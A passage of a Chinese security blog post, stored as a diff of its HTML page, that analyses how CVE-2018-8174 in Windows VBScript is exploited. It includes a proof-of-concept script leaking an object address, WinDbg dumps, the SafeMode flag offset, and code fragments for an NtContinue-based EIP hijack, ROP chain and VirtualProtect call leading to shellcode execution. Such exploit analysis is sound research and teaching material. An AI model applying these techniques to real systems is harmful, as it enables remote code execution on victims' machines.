SharedUserData!SystemCallStub (7ffe0300)</span><br><span class="line">77b95582 ff12            call    dword ptr [edx]</span><br></pre></td></tr></table></figure>
+
+<p>&#x83B7;&#x53D6;Ntdll.dll&#x7684;NtContinue&#x51FD;&#x6570;&#xFF08;&#x8BBF;&#x95EE;&#x5BFC;&#x51FA;&#x8868;&#x83B7;&#x53D6;&#xFF09;</p>
+<p>&#x7CBE;&#x5FC3;&#x6784;&#x9020;&#x4E00;&#x6BB5;ROP&#x94FE;&#xFF0C;&#x5C06;&#x5176;&#x5199;&#x5165;&#x524D;&#x9762;&#x51C6;&#x5907;&#x7684;&#x53EF;&#x63A7;&#x6570;&#x7EC4;&#x7A7A;&#x95F4;&#x3002;</p>
+<p>&#x501F;&#x52A9;&#x7279;&#x5B9A;&#x4EE3;&#x7801;&#x65F6;&#x673A;&#x653B;&#x51FB;NtContinue&#x51FD;&#x6570;&#x52AB;&#x6301;eip&#xFF0C;&#x83B7;&#x5F97;shellcode&#x6267;&#x884C;&#x3002;</p>
+<p><img src="/2019/08/12/20190812-1/1.png" alt="img"></p>
+<p>&#x603B;&#x7ED3;&#x7C7B;&#x6210;&#x5458;&#x5728;&#x5185;&#x5B58;&#x5206;&#x914D;&#x65B9;&#x6CD5;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#x3002;&#x6839;&#x636E;&#x6240;&#x6709;&#x6210;&#x5458;&#x6309;&#x9700;&#x4E14;&#x9075;&#x5FAA;&#x524D;&#x9762;&#x63D0;&#x5230;&#x7684;&#x521D;&#x59CB;&#x5316;&#x987A;&#x5E8F;&#x7533;&#x8BF7;&#x4E00;&#x5757;&#x8FDE;&#x7EED;&#x7684;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#xFF0C;&#x5404;&#x6210;&#x5458;VVAL1&#xFF0C;VVAL2&#xFF0C;VVAL3&#x2026;&#x5747;&#x4EE5;&#x4E00;&#x4E2A;0x10&#x7684;VARIANT&#x7ED3;&#x6784;&#x5448;&#x73B0;&#xFF0C;&#x76F8;&#x90BB;&#x6210;&#x5458;&#x53D8;&#x91CF;&#x4E4B;&#x95F4;&#x504F;&#x79FB;&#x7B49;&#x4E8E;&#x4E00;&#x4E2A;&#x56FA;&#x5B9A;&#x7684;&#x5185;&#x5B58;&#x7A7A;&#x95F4;0x32+&#x524D;&#x4E00;&#x4E2A;&#x6210;&#x5458;&#x540D;&#x79F0;&#xFF08;UNICODE&#x5B57;&#x7B26;&#x4E32;&#xFF09;&#x7684;&#x957F;&#x5EA6;&#x3002;</p>
+<p><img src="/2019/08/12/20190812-1/2.png" alt="img"></p>
+<p>&#x5982;&#x4F55;&#x83B7;&#x53D6;&#x5230;&#x7684;CScriptEntryPoint&#x5BF9;&#x8C61;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x53EF;&#x4EE5;&#x53C2;&#x8003;Heavenml &#x5E08;&#x5085;&#x7684;<a href="https://bbs.pediy.com/thread-248925.htm" target="_blank" rel="noopener">&#x6587;&#x7AE0;</a>&#xFF0C;&#x5176;&#x4E2D;&#x4ECB;&#x7ECD;&#x5230;&#x4E86;&#x51FD;&#x6570;&#x6307;&#x9488;&#x5411;&#x53D8;&#x91CF;&#x8D4B;&#x503C;&#x65F6;&#x7684;&#x7279;&#x6027;&#xFF0C;<br>&#x4E0B;&#x9762;&#x7684;&#x5C0F;poc&#xFF1A;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT LANGUAGE=&quot;VBScript&quot;&gt;</span><br><span class="line">On Error Resume Next</span><br><span class="line">sub testaa()</span><br><span class="line">end sub</span><br><span class="line">dim i,j</span><br><span class="line">i=testaa</span><br><span class="line">i=null</span><br><span class="line">IsEmpty(i)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>&#x8C03;&#x8BD5;&#x6570;&#x636E;&#x5982;&#x4E0B;&#xFF1A;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; bp vbscript!VbsIsEmpty</span><br><span class="line">0:005:x86&gt; g</span><br><span class="line">Breakpoint 2 hit</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">72a9c206 8bff            mov     edi,edi</span><br><span class="line">0:005:x86&gt; dd poi(esp+c)</span><br><span class="line">          VbNull            CScriptEntryPoint&#x5BF9;&#x8C61;</span><br><span class="line">0069e720  00000001 00000080 0069e7b0 6e00006e</span><br><span class="line">0069e730  0000400c 00000000 0069fc7c 00000000</span><br><span class="line">0069e740  0000400c 00000000 0069faec 00000000</span><br><span class="line">0:005:x86&gt; ln poi(0069e7b0)</span><br><span class="line">(72a84934)   vbscript!CScriptEntryPoint::`vftable&apos;   |  (72a9ab54)   vbscript!CEntryPointDispatch::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    vbscript!CScriptEntryPoint::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">0:005:x86&gt; dd 0069e7b0</span><br><span class="line">0069e7b0  72a84934 00000001 0069fc08 02990a20</span><br><span class="line">0069e7c0  02990d54 00000000 0069fc08 0069d0e0</span><br><span class="line">0069e7d0  4add8835 0000e322 02990d90 0069fe88</span><br><span class="line">0:005:x86&gt; dd 0069fc08</span><br><span class="line">0069fc08  00000006 00000000 00000000 00000000</span><br><span class="line">0069fc18  0069cdf0 00000000 0069cfc8 00693350</span><br><span class="line">0069fc28  02990a20 02990a20 67dc8819 0c00e321</span><br><span class="line">0069fc38  00000008 00000000 0069fc08 00421946</span><br><span class="line">0069fc48  61dc881f 0800e324 72a84934 00000002</span><br><span class="line">0:005:x86&gt; dd 0069cdf0</span><br><span class="line">0069cdf0  72a84868 72a84ab4 72a84410 72a843f8</span><br><span class="line">0069ce00  72a843e0 72a843cc 72a843bc 72a84388</span><br><span class="line">0069ce10  72a84d0c 72a84378 72a84368 72a84350</span><br><span class="line">0069ce20  72a8433c 72a84cfc 72a84ce4 72a84328</span><br><span class="line">0069ce30  72a84318 00000000 00000000 00000006</span><br><span class="line">0:005:x86&gt; ln 72a84868</span><br><span class="line">(72a84868)   vbscript!COleScript::`vftable&apos;   |  (72a9fdbc)   vbscript!`string&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    vbscript!COleScript::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">0:005:x86&gt; dd 0069cdf0+174</span><br><span class="line">0069cf64  0000000e 00000000 00000000 00000000</span><br><span class="line">0069cf74  00000000 00000000 003e52a8 00000000</span><br></pre></td></tr></table></figure>
+
+<p>&#x5728;&#x6267;&#x884C;i=testaa&#x7684;&#x65F6;&#x5019;&#xFF0C;VBS&#x4F7F;&#x7528;CScriptEntryPoint&#x5BF9;&#x8C61;&#x53BB;&#x68C0;&#x67E5;&#x8FD9;&#x6761;&#x8BED;&#x53E5;&#x662F;&#x4E0D;&#x5408;&#x6CD5;&#x7684;&#xFF0C;&#x968F;&#x4E4B;&#x4EA7;&#x751F;&#x4E00;&#x4E2A;&#x9519;&#x8BEF;&#xFF0C;&#x518D;CScriptEntryPoint&#x88AB;&#x5199;&#x5165;&#x4E86;CSession&#x5BF9;&#x8C61;&#x4E2D;&#xFF0C;&#x4E4B;&#x540E;i = null &#x65F6;&#xFF0C;&#x6CA1;&#x6709;&#x6E05;&#x9664;&#x6389;CScriptEntryPoint&#xFF0C;&#x5BFC;&#x81F4;CScriptEntryPoint&#x88AB;&#x6784;&#x9020;&#x8FDB;&#x4E86;VARIANT&#x7ED3;&#x6784;&#x3002;</p>
+<p>&#x901A;&#x8FC7;&#x5982;&#x4E0A;&#x7684;&#x6570;&#x636E;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#xFF0C;i&#x7684;&#x7C7B;&#x578B;&#x867D;&#x7136;&#x662F;vbNull,&#x4F46;&#x662F;&#x901A;&#x8FC7;&#x8D4B;&#x503C;&#x51FD;&#x6570;&#x5730;&#x5740;&#xFF0C;&#x5176;&#x5B9E;i&#x7684;&#x503C;&#x57DF;&#x5DF2;&#x7ECF;&#x4FDD;&#x5B58;&#x4E86;CScriptEntryPoint&#x7684;&#x5730;&#x5740;&#x3002;&#x4E8E;&#x662F;&#x5C31;&#x5B58;&#x5728;&#x5982;&#x4E0B;&#x7684;&#x5173;&#x7CFB;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*(*(CScriptEntryPoint+8)+16) = COleScriptObject</span><br><span class="line">COleScriptObject+0x174 = SafeModeMark</span><br><span class="line"></span><br><span class="line">&#x5173;&#x4E8E;shellcode&#x7684;&#x6267;&#x884C;&#x65F6;&#x673A;</span><br></pre></td></tr></table></figure>
+
+<p>//&#x65B9;&#x6CD5;&#x4E00;  &#x4FEE;&#x6539;SafeMode&#x6807;&#x5FD7; &#x4E0A;&#x5E1D;&#x6A21;&#x5F0F;</p>
+<p>//&#x65B9;&#x6CD5;&#x4E8C;</p>
+<p>VARIANT&#x7684;&#x7C7B;&#x578B;&#x88AB;&#x4FEE;&#x6539;&#x4E3A;4d&#xFF0C;&#x5728;&#x540E;&#x7EED;&#x6267;&#x884C;&#x201C; memClassA.mem(address + 8) = 0&#x201D;&#x65F6;&#xFF0C;Vbs&#x5C06;&#x68C0;&#x6D4B;&#x8BE5;VARIANT&#x7ED3;&#x6784;&#x5E76;&#x6839;&#x636E;&#x5176;&#x7C7B;&#x578B;&#x8FDB;&#x884C;&#x76F8;&#x5E94;&#x7684;&#x5904;&#x7406;&#x3002;&#x5728;&#x7C7B;&#x578B;&#x4FEE;&#x6539;&#x4E3A;4d&#x4E4B;&#x540E;&#xFF0C;&#x5BF9;&#x8BE5;&#x5730;&#x5740;&#x4E0B;&#x8BBF;&#x95EE;&#x65AD;&#x70B9;&#x5373;&#x53EF;&#x8DDF;&#x8E2A;&#x5230;&#x540E;&#x7EED;&#x7684;&#x5904;&#x7406;&#x903B;&#x8F91;&#x3002;</p>
+<p>&#x5F39;&#x51FA;trigger_var_clear&#x7A97;&#x53E3;&#xFF0C;&#x4E0B;&#x65AD;&#x70B9;&#x8FDB;&#x5165;AssignVar&#x51FD;&#x6570;&#xFF0C;&#x5355;&#x6B65;&#x8C03;&#x8BD5;&#x8FDB;&#x5165;Clear</p>
+<p><img src="/2019/08/12/20190812-1/3.png" alt="img"></p>
+<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x5C06;&#x7C7B;&#x578B;&#x4FEE;&#x6539;&#x4E3A;4d,&#x8BE5;&#x7C7B;&#x578B;&#x6807;&#x8BC6;&#x7684;&#x662F;&#x4E00;&#x4E2A;&#x6307;&#x5411;vfTable&#x7684;&#x7528;&#x4E8E;&#x5B89;&#x5168;&#x91CA;&#x653E;&#x5904;&#x7406;&#x7684;&#x7ED3;&#x6784;&#x3002;</p>
+<p><img src="/2019/08/12/20190812-1/4.png" alt="img"></p>
+<p>&#x8BBF;&#x95EE;&#x6211;&#x4EEC;&#x6784;&#x9020;&#x7684;&#x865A;&#x8868;&#x4E2D;&#x7684;ZwContinue&#x51FD;&#x6570;&#x3002;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//&#x6784;&#x5EFA;&#x653B;&#x51FB;&#x6240;&#x9700;&#x865A;&#x8868;</span><br><span class="line">bytes = bytes &amp;make_ntcontinue_bytes()</span><br></pre></td></tr></table></figure>
+
+<p>ZwContinue&#x51FD;&#x6570;&#x7684;&#x529F;&#x80FD;&#x3002;&#x5728;&#x8C03;&#x7528;&#x76F8;&#x5E94;&#x7684;&#x5F02;&#x5E38;&#x5904;&#x7406;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x65F6;&#x901A;&#x8FC7;&#x8BE5;&#x51FD;&#x6570;&#x6062;&#x590D;&#x5F02;&#x5E38;&#x53D1;&#x751F;&#x7684;&#x73AF;&#x5883;&#x4FE1;&#x606F;&#x8FDB;&#x800C;&#x8FDB;&#x884C;&#x5904;&#x7406;&#x3002;&#x501F;&#x52A9;&#x8BE5;&#x51FD;&#x6570;&#x901A;&#x8FC7;&#x4F20;&#x5165;&#x4F2A;&#x9020;&#x7684;CONTEXT&#x53C2;&#x6570;&#xFF0C;&#x76F4;&#x63A5;&#x5B9E;&#x73B0;&#x4E86;EIP&#x7684;&#x52AB;&#x6301;&#x3002;</p>
+<p>&#x5F53;eip&#x6307;&#x5411;&#x6211;&#x4EEC;&#x6784;&#x9020;&#x7684;VirtualProtect&#x51FD;&#x6570;&#x8C03;&#x7528;&#x65F6;&#xFF0C;&#x5B9E;&#x73B0;&#x4E86;&#x975E;&#x53EF;&#x6267;&#x884C;&#x5185;&#x5B58;&#xFF0C;&#x53EF;&#x8BFB;&#x53EF;&#x5199;&#x53EF;&#x6267;&#x884C;&#x3002;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes = bytes &amp;addr2str(64)   //PAGE_EXECUTE_READWRITE   &#x7B2C;&#x4E09;&#x53C2;&#x6570;</span><br></pre></td></tr></table></figure>
+
+<p>&#x6700;&#x7EC8;&#x5B9E;&#x73B0;shellcode&#x6267;&#x884C;&#x3002;</p>
+<p><img src="/2019/08/12/20190812-1/5.png" alt="img"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+      <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/2019/08/12/20190812-1/">CVE-2018-8174：从UAF到任意地址读写</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 Saturn35 的个人博客">Saturn35</a></p>
+  <p><span>发布时间:</span>2019年08月12日 - 14:00</p>
+  <p><span>最后更新:</span>2019年12月28日 - 13:22</p>
+  <p><span>原始链接:</span><a href="/2019/08/12/20190812-1/" title="CVE-2018-8174：从UAF到任意地址读写">https://saturn35.github.io/2019/08/12/20190812-1/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://saturn35.github.io/2019/08/12/20190812-1/" aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+      
+      </div>
+      
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/03/20190803-1/" rel="next" title="[06] HEVD 内核漏洞之池溢出">
+                <i class="fa fa-chevron-left"></i> [06] HEVD 内核漏洞之池溢出
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/08/13/20190813-1/" rel="prev" title="从cve-2018-8174到VBScript解释器的内部结构">
+                从cve-2018-8174到VBScript解释器的内部结构 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/head.jpg" alt="Saturn35">
+            
+              <p class="site-author-name" itemprop="name">Saturn35</p>
+              <p class="site-description motion-element" itemprop="description">心诚求之，虽不中，不远矣。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Saturn35" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:huity35@outlook.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/Saturn35_Huity" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://passport.kanxue.com/user-center-831334.htm" target="_blank" title="kanxue">
+                      
+                        <i class="fa fa-fw fa-book"></i>kanxue</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00-背景"><span class="nav-number">1.</span> <span class="nav-text">0x00 背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-漏洞原理"><span class="nav-number">2.</span> <span class="nav-text">0x01 漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">0x02 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#调试结果"><span class="nav-number">3.1.</span> <span class="nav-text">调试结果</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Saturn35</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">88.0k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+<script type="text/javascript" src="/js/src/click_show_text.js"></script>
+
+<script type="text/javascript" src="/js/src/FunnyTitle.js"></script>
